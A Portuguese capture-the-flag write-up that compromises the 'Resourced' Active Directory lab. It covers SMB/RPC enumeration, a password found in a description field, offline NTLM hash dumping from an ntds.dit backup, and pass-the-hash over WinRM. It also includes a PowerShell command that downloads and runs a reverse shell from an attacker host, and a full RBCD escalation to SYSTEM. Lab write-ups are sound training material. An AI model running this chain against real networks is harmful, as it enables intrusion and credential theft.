---
layout: writeup
title: Resourced
platform: pg
difficulty: intermediate
os: windows
---

> **Dificuldade**: Médio (opinião: difícil)
{: .prompt-info }

> Writeup importado do Notion. Imagens originais omitidas.
{: .prompt-tip }

## 1. Escaneamento

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn
389/tcp   open  ldap          AD LDAP (Domain: resourced.local)
445/tcp   open  microsoft-ds
3268/tcp  open  ldap          AD LDAP Global Catalog
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          WinRM
9389/tcp  open  mc-nmf        .NET Message Framing
```

Domain Controller `RESOURCEDC` no domínio `resourced.local`.

## 2. Enumeração

### Null session SMB → enumdomusers

```bash
enum4linux 192.168.87.175
```

Null session permitida. RPC enumera 13 usuários do domínio.

Enumeração manual:

```bash
rpcclient -U "" -N resourced.local
rpcclient $> enumdomusers
rpcclient $> queryuser 0x453  # V.Ventz
```

### Credentials Leak no campo "Description"

O campo `description` de `V.Ventz` revela senha em texto claro:

```
'1107':
  username: V.Ventz
  description: 'New-hired, reminder: HotelCalifornia194!'
```

**Cred 1:** `V.Ventz` : `HotelCalifornia194!`

### Backup do NTDS exposto

Compartilhamento SMB com backup do AD. Download de `ntds.dit` + `SYSTEM` hive.

## 3. Acesso Inicial

### secretsdump offline

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

Hashes NTLM extraídos:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::
...
```

### Pass-the-Hash via CME (WinRM)

Testa todos os hashes em SMB e WinRM:

```bash
crackmapexec winrm 192.168.87.175 -u l.livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808 -x "whoami"
```

```
WINRM  192.168.87.175  5985  RESOURCEDC  [+] resourced.local\l.livingstone:19a3a7... (Pwn3d!)
```

Reverse shell via PowerShell IEX:

```bash
crackmapexec winrm 192.168.87.175 -u l.livingstone \
  -H 19a3a7550ce8c505c2d46b5e39d6f808 \
  -x "IEX(New-Object System.Net.WebClient).DownloadString(\'http://192.168.49.87/Invoke-PowerShellTcp.ps1\')"
```

## 4. Pós-Exploração

```powershell
whoami /priv
```

```
SeMachineAccountPrivilege     Enabled  # CRÍTICO — pode criar machine accounts
SeChangeNotifyPrivilege       Enabled
SeIncreaseWorkingSetPrivilege Enabled
```

**`SeMachineAccountPrivilege`** ativo + `MachineAccountQuota` default → **RBCD attack viável**.

## 5. Escalação de Privilégio — RBCD (Resource-Based Constrained Delegation)

### Passo 1 — Criar machine account fake

```bash
addcomputer.py resourced.local/l.livingstone -dc-ip 192.168.87.175 \
  -hashes :19a3a7550ce8c505c2d46b5e39d6f808 \
  -computer-name "ATTACK$" -computer-pass "AttackerPC1!"
```

```
[*] Successfully added machine account ATTACK$ with password AttackerPC1!.
```

### Passo 2 — Configurar RBCD no DC apontando para ATTACK$

```bash
python3 rbcd.py -dc-ip 192.168.87.175 -t RESOURCEDC -f "ATTACK" \
  -hashes :19a3a7550ce8c505c2d46b5e39d6f808 \
  resourced\l.livingstone
```

```
[*] Writing SECURITY_DESCRIPTOR related to (fake) computer `ATTACK` into msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `RESOURCEDC`
[*] Delegation rights modified succesfully!
[*] ATTACK$ can now impersonate users on RESOURCEDC$ via S4U2Proxy
```

### Passo 3 — S4U2Self + S4U2Proxy para impersonar Administrator

```bash
getST.py -spn cifs/resourcedc.resourced.local \
  resourced/attack$:"AttackerPC1!" \
  -impersonate Administrator \
  -dc-ip 192.168.87.175
```

Ticket salvo em `Administrator.ccache`.

### Passo 4 — psexec com TGS de Administrator

```bash
export KRB5CCNAME=./Administrator.ccache
echo "192.168.87.175 resourcedc.resourced.local" | sudo tee -a /etc/hosts

psexec.py -k -no-pass resourcedc.resourced.local -dc-ip 192.168.87.175
```

```
C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type C:\Users\Administrator\Desktop\proof.txt
0fabee63237bc84ca977b282bc3de60e
```

## Resumo da Cadeia

| Etapa | Técnica |
|-------|---------|
| Recon | nmap, null SMB session, RPC enumdomusers |
| Cred Leak | Description field de V.Ventz expõe senha |
| Lateral | Backup ntds.dit → secretsdump → hash dump |
| Pivot | Pass-the-Hash de L.Livingstone via WinRM |
| PrivEsc | RBCD: addcomputer → rbcd.py → S4U2Self/Proxy → psexec como SYSTEM |
